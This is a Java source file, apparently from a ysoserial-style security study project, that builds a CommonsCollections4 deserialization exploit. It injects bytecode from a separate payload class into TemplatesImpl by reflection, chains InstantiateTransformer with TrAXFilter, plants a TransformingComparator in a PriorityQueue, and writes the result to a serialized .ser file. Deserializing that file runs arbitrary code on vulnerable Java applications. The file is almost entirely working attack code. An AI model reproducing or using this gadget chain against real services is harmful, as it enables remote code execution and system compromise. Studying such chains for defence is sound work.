package CommonsCollections4;
import  com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;



import javax.xml.transform.Templates;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class exp {
    public static void main(String[] args) throws IOException, CannotCompileException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NotFoundException {
        TemplatesImpl tmp = new TemplatesImpl();
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(payload.class));

        CtClass pay_class = pool.get(payload.class.getName());
        byte[] payCode = pay_class.toBytecode();
        Class clazz;
        clazz =Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        //存储payload类
        Field byteCode = clazz.getDeclaredField("_bytecodes");
        byteCode.setAccessible(true);
        byteCode.set(tmp,new byte[][]{payCode});
        Field name  = clazz.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmp,"tr1ple");

        Transformer[] trans = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{tmp})
        };


        ChainedTransformer chian = new ChainedTransformer(trans);
        //PriorityQueue<Object> queue = new PriorityQueue(2,new TransformingComparator(chian));
        TransformingComparator transCom = new TransformingComparator(chian);

        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);


        Field com = PriorityQueue.class.getDeclaredField("comparator");
        com.setAccessible(true);
        com.set(queue,transCom);

        //序列化
        File file;
        file = new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections4.ser");
        ObjectOutputStream obj_out = new ObjectOutputStream(new FileOutputStream(file));
        obj_out.writeObject(queue);

    }
}